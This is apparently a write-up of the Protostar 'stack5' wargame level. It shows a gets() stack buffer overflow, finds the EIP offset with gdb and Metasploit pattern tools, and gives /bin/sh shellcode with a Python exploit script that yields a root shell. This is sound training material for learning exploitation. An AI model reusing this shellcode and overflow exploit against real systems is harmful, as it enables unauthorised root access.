## stack5

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

At this point in time, it might be easier to use someone elses shellcode
If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.

We can use int3 opcode \xcc since it is the instruction to trap to debugger we can test whether our exploit is working or not if we are able to execute \xcc instead of actual shellcode.

### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


Finding the offset

```bash
msf-pattern_create -l 80
```

```gdb
user@protostar:/opt/protostar/bin$ gdb  -q stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) info registers
eax            0xbffff770       -1073744016
ecx            0xbffff770       -1073744016
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7c0       0xbffff7c0
ebp            0x41346341       0x41346341
esi            0x0      0
edi            0x0      0
eip            0x63413563       0x63413563
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```

eip = 0x63413563
esp = 0xbffff7c0

```bash
msf-pattern_offset -l 80 -q 0x63413563
```
we find the offset = 76


/bin/sh shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php

```shellcode
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

exploit.py

```python
import struct

padding = "A"* 76
addr=struct.pack("I",0xbffff7c0)

nopslide="\x90"*16

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buffer = padding + addr + nopslide + shellcode

print buffer
```

```bash
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py;cat) |./stack5
whoami
root
```
Here ;cat is used after executing our exploit because if we had not used cat then the output of our exploit script which would be the input for the next command which is connected by a pipe i.e ./stack5, here a /bin/sh shell process would have been started but it would have terminated the stdin stream, so we wont be able to pass any commands as stdin is closed thats where the cat command comes in, it allows us to pass the commands we wish to execute via stdin by feeding it to the program. It's a neat work around.

In simpler words:

the cat command just reads from the current stdin and feeds it to the program, thus providing the one executing this command line with a way to feed its own data from the terminal to the program and this way probably to some /bin/sh or similar executed from this program
